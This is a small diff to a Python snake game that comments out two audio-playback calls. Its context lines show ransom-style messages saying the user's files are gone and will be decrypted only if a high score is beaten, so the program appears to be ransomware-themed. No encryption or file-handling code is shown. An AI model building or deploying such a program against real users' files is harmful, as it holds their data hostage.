@@ -90,8 +90,8 @@ class SnakeGame():
         self.pen.write("Your files are gone :))).",
                        align="center", font=("Courier", 24, "normal"))
 
-        playsound(os.path.join(os.path.split(
-            __file__)[0], "audio", "intro.wav"))
+        # playsound(os.path.join(os.path.split(
+        #    __file__)[0], "audio", "intro.wav"))
         self.pen.clear()
         self.pen.write("Beat the high score to get them back.",
                        align="center", font=("Courier", 24, "normal"))
@@ -167,8 +167,8 @@ class SnakeGame():
                     self.pen.write("You did it!! Decrypting files...",
                                    align="center",
                                    font=("Courier", 24, "normal"))
-                    playsound(os.path.join(os.path.split(
-                        __file__)[0], "audio", "outro.wav"))
+                    # playsound(os.path.join(os.path.split(
+                    #    __file__)[0], "audio", "outro.wav"))
 
                     self.wn.bye()
                     break
